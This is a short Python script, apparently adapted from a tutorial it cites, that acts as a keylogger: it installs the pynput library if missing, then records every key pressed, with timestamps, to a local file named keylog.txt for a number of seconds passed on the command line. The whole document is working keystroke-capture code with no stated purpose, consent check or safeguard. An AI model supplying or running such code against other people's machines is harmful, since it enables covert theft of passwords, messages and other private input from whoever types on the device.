"""
References:
1) https://www.askpython.com/python/examples/python-keylogger
"""
import logging
from threading import Timer
from installer import install
import sys

# import libraries if available, if not install them
try:
        from pynput.keyboard import Key, Listener
except:
        install('pynput')

LOG_INTERVAL = int(sys.argv[1])
logging.basicConfig(filename=("keylog.txt"), level=logging.DEBUG, filemode='w', format=" %(asctime)s - %(message)s")

def on_press(key):
        logging.info(str(key))

with Listener(on_press=on_press) as listener :
        Timer(LOG_INTERVAL, listener.stop).start()
        listener.join()

